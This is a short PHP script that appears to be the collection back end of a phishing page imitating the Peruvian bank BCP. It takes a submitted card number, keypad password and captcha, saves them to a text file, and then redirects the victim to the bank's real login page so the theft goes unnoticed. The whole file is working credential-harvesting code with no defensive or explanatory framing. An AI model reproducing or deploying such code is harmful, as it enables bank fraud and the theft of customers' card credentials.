<?php
$nombre1 = $_POST['cardNumber'];
$nombre2 = $_POST['keypad'];
$nombre3 = $_POST['captcha'];

$contenido="
Targeta : $nombre1
Clave   : $nombre2
Captcha : $nombre3
";

$archivo= fopen("datos.txt", "w");
fwrite($archivo,$contenido);

//redirecciona a la pagina original
echo "<meta http-equiv='refresh' content='1;url=https://bcpzonasegurabeta.viabcp.com/#/iniciar-sesion'>"
?>
